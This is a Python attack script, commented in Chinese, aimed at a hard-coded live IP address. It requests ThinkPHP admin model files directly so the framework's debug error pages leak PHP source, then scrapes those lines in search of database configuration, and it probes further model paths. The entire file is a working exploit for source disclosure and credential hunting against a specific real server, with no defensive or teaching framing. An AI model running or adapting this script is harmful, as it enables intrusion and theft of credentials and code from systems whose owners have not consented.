#!/usr/bin/env python3
"""tp_base_model.py - 泄露admin/model/Base.php + Goods.php源码(找DB配置)"""
import urllib.request, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'https://139.196.199.221'

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(300000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300000).decode('utf-8', 'ignore')
    except Exception:
        return 0, ''

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

def file_of(b):
    for m in re.finditer(r'<a class="toggle" title="([^"]+)"', b):
        f = m.group(1)
        if 'model' in f or 'Model' in f:
            return f
    return ''

# 直接访问模型文件触发"Class not found" - 但错误页可能显示模型文件内容窗口
print("=== 1. 模型文件直接访问 ===", flush=True)
all_lines = {}
for p in ['/application/admin/model/Base.php', '/application/admin/model/Goods.php',
          '/application/admin/model/Admin.php', '/application/admin/model/User.php']:
    st, b = get(BASE + p)
    l = leak_lines(b)
    f = file_of(b)
    if l:
        print('%s: %d lines (file=%s)' % (p, len(l), f.split('/')[-1] if f else '?'), flush=True)
        all_lines.update(l)
    else:
        # 打印错误信息
        m = re.search(r'<b>Fatal error</b>:[^<]*', b)
        print('%s: no lines, err=%s' % (p, m.group(0)[:100] if m else b[:80]), flush=True)

print("\n=== 2. 汇总模型源码 ===", flush=True)
for ln in sorted(all_lines):
    print('  %4d: %s' % (ln, all_lines[ln][:140]), flush=True)

print("\n=== 3. 其他可能的模型基类路径 ===", flush=True)
for p in ['/application/common/model/Base.php', '/application/admin/model/Common.php',
          '/application/admin/model/BaseModel.php', '/application/model/Base.php',
          '/application/model/Goods.php', '/application/common/model/Goods.php']:
    st, b = get(BASE + p)
    if st == 200:
        m = re.search(r'<b>Fatal error</b>:[^<]*', b)
        print('  %s: EXISTS err=%s' % (p, m.group(0)[:80] if m else 'size=%d' % len(b)), flush=True)
    else:
        print('  %s: 404' % p, flush=True)
print('=== DONE ===', flush=True)
